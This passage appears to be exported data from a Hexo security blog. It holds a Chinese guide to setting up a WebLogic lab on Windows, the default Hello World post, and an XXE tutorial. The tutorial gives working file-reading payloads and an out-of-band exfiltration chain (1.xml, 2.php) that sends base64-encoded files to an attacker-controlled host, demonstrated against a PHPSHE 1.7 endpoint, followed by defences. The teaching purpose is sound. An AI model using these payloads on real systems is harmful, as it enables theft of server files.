\n\n9、开始安装\n![upload successful](/images/16/9.png) \n\n10、安装成功\n![upload successful](/images/16/10.png) \n\n11、点击完成，弹出quickstart\n![upload successful](/images/16/11.png) \n\n12、点击getting started with WebLogic Server 10.3.6，创建新的域\n![upload successful](/images/16/12.png) \n\n13、点击下一步，这里默认即可\n![upload successful](/images/16/13.png) \n\n14、域名，就用默认的\n![upload successful](/images/16/14.png) \n\n15、下一步，设置名称和口令\n![upload successful](/images/16/15.png) \n\n16、设置好之后点击下一步，这里选择生产模式\n![upload successful](/images/16/16.png) \n\n17、下一步，可选设置，这里不选。\n![upload successful](/images/16/17.png) \n\n18、配置概要，默认即可，点击创建\n![upload successful](/images/16/18.png) \n\n19、完成\n![upload successful](/images/16/19.png) \n\n20、安装完成后，在这个路径下可以开启weblogic\n```\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Oracle Enterprise Pack for Eclipse\\User Projects\\base_domain\n```\n22、双击打开，输入之前设置的用户名和密码，启动服务\n![upload successful](/images/16/20.png) \n\n23、打开192.168.137.1:7001/console/，成功访问管理登录界面\n![upload successful](/images/16/21.png) \n\n","source":"_posts/Windows搭建weblogic环境.md","raw":"---\ntitle: Windows搭建weblogic环境\ntags: \n  - 环境搭建\n  - weblogic\n  - windows\ncategories: 环境搭建\nkeywords: '环境搭建,weblogic,windows'\ndescription: Windows搭建weblogic环境\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.51wendang.com%2Fpic%2F10b9ee610cba11bb1d02938e%2F5-810-jpg_6-1080-0-0-1080.jpg&refer=http%3A%2F%2Fwww.51wendang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630917022&t=a4900175111cf1e7c26c7a5ed713c7af\ndate: 2020-09-30 10:45:41\n---\n\n介于网络上weblogic漏洞环境基本上都是通过docker+vulhub进行搭建的，而有的小伙伴想要通过windows来搭建而没有教程，下面我将向大家介绍如何通过windows来搭建weblogic环境。\n\n\n1、下载好weblogic的安装文件，双击运行\n下载地址：https://www.oracle.com/middleware/technologies/weblogic.html\n![upload successful](/images/16/1.png) \n\n2、读条结束弹出安装界面\n![upload successful](/images/16/2.png) \n\n3、点击下一步，设置目录\n![upload successful](/images/16/3.png) \n\n4、设置好目录后，进入设置更新界面，这里将勾去掉，不更新。\n![upload successful](/images/16/4.png) \n\n5、下一步，安装类型选择典型即可\n![upload successful](/images/16/5.png) \n\n6、安装目录，这里我选择默认，也可以自行调整\n![upload successful](/images/16/6.png) \n\n7、快捷方式，直接下一步\n![upload successful](/images/16/7.png) \n\n8、安装概要，不配置，下一步\n![upload successful](/images/16/8.png) \n\n9、开始安装\n![upload successful](/images/16/9.png) \n\n10、安装成功\n![upload successful](/images/16/10.png) \n\n11、点击完成，弹出quickstart\n![upload successful](/images/16/11.png) \n\n12、点击getting started with WebLogic Server 10.3.6，创建新的域\n![upload successful](/images/16/12.png) \n\n13、点击下一步，这里默认即可\n![upload successful](/images/16/13.png) \n\n14、域名，就用默认的\n![upload successful](/images/16/14.png) \n\n15、下一步，设置名称和口令\n![upload successful](/images/16/15.png) \n\n16、设置好之后点击下一步，这里选择生产模式\n![upload successful](/images/16/16.png) \n\n17、下一步，可选设置，这里不选。\n![upload successful](/images/16/17.png) \n\n18、配置概要，默认即可，点击创建\n![upload successful](/images/16/18.png) \n\n19、完成\n![upload successful](/images/16/19.png) \n\n20、安装完成后，在这个路径下可以开启weblogic\n```\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Oracle Enterprise Pack for Eclipse\\User Projects\\base_domain\n```\n22、双击打开，输入之前设置的用户名和密码，启动服务\n![upload successful](/images/16/20.png) \n\n23、打开192.168.137.1:7001/console/，成功访问管理登录界面\n![upload successful](/images/16/21.png) \n\n","slug":"Windows搭建weblogic环境","published":1,"updated":"2021-08-07T16:21:16.495Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpf6000fvkq3ejlw3yya","content":"<p>介于网络上weblogic漏洞环境基本上都是通过docker+vulhub进行搭建的，而有的小伙伴想要通过windows来搭建而没有教程，下面我将向大家介绍如何通过windows来搭建weblogic环境。</p>\n<p>1、下载好weblogic的安装文件，双击运行<br>下载地址：<a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\">https://www.oracle.com/middleware/technologies/weblogic.html</a><br><img src=\"/images/16/1.png\" alt=\"upload successful\"> </p>\n<p>2、读条结束弹出安装界面<br><img src=\"/images/16/2.png\" alt=\"upload successful\"> </p>\n<p>3、点击下一步，设置目录<br><img src=\"/images/16/3.png\" alt=\"upload successful\"> </p>\n<p>4、设置好目录后，进入设置更新界面，这里将勾去掉，不更新。<br><img src=\"/images/16/4.png\" alt=\"upload successful\"> </p>\n<p>5、下一步，安装类型选择典型即可<br><img src=\"/images/16/5.png\" alt=\"upload successful\"> </p>\n<p>6、安装目录，这里我选择默认，也可以自行调整<br><img src=\"/images/16/6.png\" alt=\"upload successful\"> </p>\n<p>7、快捷方式，直接下一步<br><img src=\"/images/16/7.png\" alt=\"upload successful\"> </p>\n<p>8、安装概要，不配置，下一步<br><img src=\"/images/16/8.png\" alt=\"upload successful\"> </p>\n<p>9、开始安装<br><img src=\"/images/16/9.png\" alt=\"upload successful\"> </p>\n<p>10、安装成功<br><img src=\"/images/16/10.png\" alt=\"upload successful\"> </p>\n<p>11、点击完成，弹出quickstart<br><img src=\"/images/16/11.png\" alt=\"upload successful\"> </p>\n<p>12、点击getting started with WebLogic Server 10.3.6，创建新的域<br><img src=\"/images/16/12.png\" alt=\"upload successful\"> </p>\n<p>13、点击下一步，这里默认即可<br><img src=\"/images/16/13.png\" alt=\"upload successful\"> </p>\n<p>14、域名，就用默认的<br><img src=\"/images/16/14.png\" alt=\"upload successful\"> </p>\n<p>15、下一步，设置名称和口令<br><img src=\"/images/16/15.png\" alt=\"upload successful\"> </p>\n<p>16、设置好之后点击下一步，这里选择生产模式<br><img src=\"/images/16/16.png\" alt=\"upload successful\"> </p>\n<p>17、下一步，可选设置，这里不选。<br><img src=\"/images/16/17.png\" alt=\"upload successful\"> </p>\n<p>18、配置概要，默认即可，点击创建<br><img src=\"/images/16/18.png\" alt=\"upload successful\"> </p>\n<p>19、完成<br><img src=\"/images/16/19.png\" alt=\"upload successful\"> </p>\n<p>20、安装完成后，在这个路径下可以开启weblogic</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Oracle Enterprise Pack for Eclipse\\User Projects\\base_domain</span><br></pre></td></tr></table></figure>\n<p>22、双击打开，输入之前设置的用户名和密码，启动服务<br><img src=\"/images/16/20.png\" alt=\"upload successful\"> </p>\n<p>23、打开192.168.137.1:7001/console/，成功访问管理登录界面<br><img src=\"/images/16/21.png\" alt=\"upload successful\"> </p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>介于网络上weblogic漏洞环境基本上都是通过docker+vulhub进行搭建的，而有的小伙伴想要通过windows来搭建而没有教程，下面我将向大家介绍如何通过windows来搭建weblogic环境。</p>\n<p>1、下载好weblogic的安装文件，双击运行<br>下载地址：<a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\">https://www.oracle.com/middleware/technologies/weblogic.html</a><br><img src=\"/images/16/1.png\" alt=\"upload successful\"> </p>\n<p>2、读条结束弹出安装界面<br><img src=\"/images/16/2.png\" alt=\"upload successful\"> </p>\n<p>3、点击下一步，设置目录<br><img src=\"/images/16/3.png\" alt=\"upload successful\"> </p>\n<p>4、设置好目录后，进入设置更新界面，这里将勾去掉，不更新。<br><img src=\"/images/16/4.png\" alt=\"upload successful\"> </p>\n<p>5、下一步，安装类型选择典型即可<br><img src=\"/images/16/5.png\" alt=\"upload successful\"> </p>\n<p>6、安装目录，这里我选择默认，也可以自行调整<br><img src=\"/images/16/6.png\" alt=\"upload successful\"> </p>\n<p>7、快捷方式，直接下一步<br><img src=\"/images/16/7.png\" alt=\"upload successful\"> </p>\n<p>8、安装概要，不配置，下一步<br><img src=\"/images/16/8.png\" alt=\"upload successful\"> </p>\n<p>9、开始安装<br><img src=\"/images/16/9.png\" alt=\"upload successful\"> </p>\n<p>10、安装成功<br><img src=\"/images/16/10.png\" alt=\"upload successful\"> </p>\n<p>11、点击完成，弹出quickstart<br><img src=\"/images/16/11.png\" alt=\"upload successful\"> </p>\n<p>12、点击getting started with WebLogic Server 10.3.6，创建新的域<br><img src=\"/images/16/12.png\" alt=\"upload successful\"> </p>\n<p>13、点击下一步，这里默认即可<br><img src=\"/images/16/13.png\" alt=\"upload successful\"> </p>\n<p>14、域名，就用默认的<br><img src=\"/images/16/14.png\" alt=\"upload successful\"> </p>\n<p>15、下一步，设置名称和口令<br><img src=\"/images/16/15.png\" alt=\"upload successful\"> </p>\n<p>16、设置好之后点击下一步，这里选择生产模式<br><img src=\"/images/16/16.png\" alt=\"upload successful\"> </p>\n<p>17、下一步，可选设置，这里不选。<br><img src=\"/images/16/17.png\" alt=\"upload successful\"> </p>\n<p>18、配置概要，默认即可，点击创建<br><img src=\"/images/16/18.png\" alt=\"upload successful\"> </p>\n<p>19、完成<br><img src=\"/images/16/19.png\" alt=\"upload successful\"> </p>\n<p>20、安装完成后，在这个路径下可以开启weblogic</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Oracle Enterprise Pack for Eclipse\\User Projects\\base_domain</span><br></pre></td></tr></table></figure>\n<p>22、双击打开，输入之前设置的用户名和密码，启动服务<br><img src=\"/images/16/20.png\" alt=\"upload successful\"> </p>\n<p>23、打开192.168.137.1:7001/console/，成功访问管理登录界面<br><img src=\"/images/16/21.png\" alt=\"upload successful\"> </p>\n"},{"title":"Hello World","date":"2020-01-13T16:00:00.000Z","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2020-01-14 00:00:00\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"updated":"2021-08-07T08:01:32.418Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpf7000gvkq39lv1940i","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"cover":"/img/12.jpeg","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"一次面试引发的XXE学习","keywords":"web安全,xxe,xml,外部实体","description":"一次面试引发的XXE学习","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20170830%2F278c768085a743e8850561b1bc33f104.jpeg&refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747032&t=c7b74bfc2b5a10bcac1cda86889c9cdd","date":"2020-11-05T08:45:44.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 文章已发布到公众号：广软NSDA安全团队\n> 标题：面试某公司渗透岗引发的XXE学习\n> 链接：https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA\n\n# 前言\n\n刚刚进行了某公司渗透岗的面试，经历过多次面试的我发现，面试官很喜欢问XXE漏洞，而这也是很多人所不了解或者了解有限的，这里我希望通过一篇推文，让大家入门XXE漏洞，对于以后的面试甚至工作有所帮助。\n\n\n# XXE\nXML External Entity 即外部实体，从安全角度理解为XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，可以允许引入外部实体，攻击者通过伪造外部实体而触发漏洞。\n通俗点就是我们可以控制它解析我们传入的来自外部的实体而造成的漏洞。\n\n# XML外部实体注入攻击\n接下来我将对XML外部实体注入进行拆分解释：\n1.XML\n       可扩展标记语言（可以自己发明标签；在HTML中标签已经被预定义好了，可以直接使用）\n类似HTML\n设计宗旨为传输数据而非显示数据\n标签未定义\n自我描述性\nW3C标准\n（总结：XML就是用来存储传输数据的、可以自己发明标签）\n\n2.外部实体：外部的DTD（后面详细介绍什么是DTD部分）\n3.注入（所有注入都可以这样定义）：\n              1.用户能够控制输入\n              2.用户输入的数据被拼接到了原本要执行的代码一起执行\n\n#     标准的XXE攻击payload\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807027-8d35847c-5340-4ef7-8862-b5120c4ca214.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=816&status=done&style=none&width=415)\n       XML声明 - 类似PHP的<?php?>、用来声明此为XML\n       DTD – 可以理解为模板或规则，这里定义了一个标签foo以及通过file伪协议读取了/etc/passwd的内容\n       XML部分 调用了DTD部分定义的东西来执行，就如HTML中的标签，我们直接引用<h1>xxe</h1>表示将xxe作为1级标题加大&加粗字体。（只不过在XML中我们需要自己定义标签的含义）\n\n# 我是这样理解XXE漏洞的：\n1、 可以传参XML内容\n2、 XML内容会被放到代码中执行\n3、 传入恶意的DTD部分，使用SYSTEM与伪协议读取敏感信息或执行其他伪协议操作\n\n# 从代码层面出发理解XXE：\nPHP中存在一个函数：\nsimplexml_load_string('XML内容','SimpleXMLElement',LIBXML_NOENT)\n作用是将XML转化为对象\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807365-68cd40c2-5126-406d-a912-dc67650d2ace.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=1450&status=done&style=none&width=415)\n这里写段简单的代码看看效果：\n1、 在C盘放一个flag.txt文件，内容为this is good flag.\n2、 写一段PHP代码，通过simplexml_load_string解析XML内容，读取flag.txt的内容并输出\n附上代码，可以自己尝试，注意需要web环境，可以通过phpstudy快速搭建：\n<?php\n       $a = '<!DOCTYPE scan [<!ENTITY test SYSTEM \"file:///C:/flag.txt\">]><scan>&test;</scan>';\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?>\n\n是不是没什么感觉呢，那么我修改代码看看：\n<?php\n       @$a = file_get_contents(\"php://input\");\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?>\n这里可以看到原来的xml没了，变成了通过读取POST传输的数据，那么我们传参原来的payload，一样可以利用。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807673-117ec659-7045-43e0-b742-cd1d4b03ddf5.png#align=left&display=inline&height=164&margin=%5Bobject%20Object%5D&originHeight=494&originWidth=1247&status=done&style=none&width=415)\n# XXE无回显\n现在就要考虑另一个问题了，因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到，在上面的实验代码中可以通过删除最后的print($b)来实现这样的操作。XXE不回显问题当然也是有解决办法的，不知道大家接触过DNSLOG吗，可以通过咋域名前面放入查询出的内容，将数据通过dns日志记录下来。\nXXE虽然不是通过DNSlog，但是也同样是外带数据。\n流程如下：\n在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。\n具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上的。\n1.xml\n              <!ENTITY% all \"<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>\">%all;\n2.php\n              <?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?>\n3.txt\n       内容空\n\n# 实战演示：\n下面我将以PHPSHE1.7 cms来进行实战讲解\n1、 首先下载获取源码，在全局中搜索解析xml的函数simplexml_load_string，获取到2个php文件\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807995-b6b408a1-1c2c-42d7-8a3e-d06d5b6da135.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=687&originWidth=1641&status=done&style=none&width=415)\n2、 在include/function/global.func.php文件中可以看到，很熟悉的操作，通过php://input获取POST传参的内容，然后进行解析。（json_decode( )    ---- json 转 对象/数组）\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808483-5b780c7d-d926-44c6-981a-a02cc1ce5da5.png#align=left&display=inline&height=40&margin=%5Bobject%20Object%5D&originHeight=128&originWidth=1331&status=done&style=none&width=415)\n3、 这里因为是在函数pe_getxml中，所以还需要全局搜索看看哪些php文件调用了这个函数\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808778-ff3a23f4-6fa9-4caa-9c11-8cf42d7f3e2c.png#align=left&display=inline&height=59&margin=%5Bobject%20Object%5D&originHeight=135&originWidth=946&status=done&style=none&width=415)\n4、 第二个明显不是了，那就只能看第一个，点击查看代码\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809168-eeeba45c-8bbc-4061-9cd5-87a52e583ca2.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&originHeight=106&originWidth=788&status=done&style=none&width=415)\n5、 又在一个函数中，可以看到这个是接收微信xml数据的，那么我们再全局搜索wechat_getxml函数\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809522-3fdb9992-647f-4dd3-a4d8-513fec09f00b.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&originHeight=167&originWidth=1035&status=done&style=none&width=415)\n6、 可以定位到/include/plugin/payment/wechat/notify_url.php文件\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809899-7219a65d-c02c-4a35-ba44-cec786004556.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1126&status=done&style=none&width=415)\n7、 现在就已经发现了漏洞利用链，首先notify_url.php文件调用了wechat_getxml函数，wechat_getxml函数调用了pe_getxml函数，pe_getxml函数存在XXE漏洞，这里明显没有输出解析后的内容，即XXE无回显，所以我们还需要一台攻击机，在里面放上1.xml、2.php、3.txt\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810126-a505d447-4590-4ed6-87eb-1c00d48de8af.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&originHeight=231&originWidth=718&status=done&style=none&width=415)\n8、 内容如下：\n1.xml\n<!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://192.168.229.1/xxe/2.php?id=%file;'>\">%all;\n2.php\n<?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?>\n3.txt\n内容空\n9、 接下来搭建环境，通过phpstudy傻瓜式搭建phpshe网站\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810576-8dffa83a-e1a2-4f82-b199-643e379a0cab.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&originHeight=888&originWidth=1630&status=done&style=none&width=416)\n10、          访问存在漏洞的文件，确定文件是否存在，文件路径：/include/plugin/payment/wechat/notify_url.php\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810985-db91fa42-6f99-4248-a982-bccb78a1ddc3.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&originHeight=449&originWidth=1047&status=done&style=none&width=416)\n11、          可以看到，页面空白，说明确实存在这个页面。然后看看这次要获取的内容为服务器网站目录下的flag.txt文件，内容为This is my important data.。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317811565-6239b783-6629-4700-a217-a5245cfd7472.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1201&status=done&style=none&width=416)\n12、          接下来开始攻击，抓取该页面的数据包，修改传参方式为post，放上payload\npayload：\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW/flag.txt\">\n<!ENTITY % remote SYSTEM \"http://192.168.229.1/xxe/1.xml\">\n%remote;\n%send;\n]>\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812027-9555a8ec-3c57-4526-8d5a-9ff888bdb1b7.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=263&originWidth=896&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812280-8c2d2d56-24f7-453b-a597-2cbb522d57ce.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&originHeight=379&originWidth=1043&status=done&style=none&width=415)\n13、          放包，回去查看3.txt，发现已经有获取到内容了\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812577-94b84759-c4ae-48c6-b9cc-5104fe517397.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&originHeight=239&originWidth=674&status=done&style=none&width=404)\n14、          Base64解密，获取信息\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812955-ffd2d37e-56f8-4fa0-846c-75ffe1365e55.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=1350&status=done&style=none&width=416)\n# 防御方法：\n1.     使用开发语言提供的禁用外部实体的方法\nPHP：\nlibxml_disable_entity_loader(true);\n\nJAVA:\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n\nPython：\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n\n2.     过滤关键词：SYSTEM、PUBLIC等\n","source":"_posts/一次面试引发的XXE学习.md","raw":"---\ntitle: 一次面试引发的XXE学习\ntags: \n  - web安全\n  - xxe\n  - xml外部实体注入\ncategories: web安全\nkeywords: 'web安全,xxe,xml,外部实体'\ndescription: 一次面试引发的XXE学习\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20170830%2F278c768085a743e8850561b1bc33f104.jpeg&refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747032&t=c7b74bfc2b5a10bcac1cda86889c9cdd\ndate: 2020-11-05 16:45:44\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 文章已发布到公众号：广软NSDA安全团队\n> 标题：面试某公司渗透岗引发的XXE学习\n> 链接：https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA\n\n# 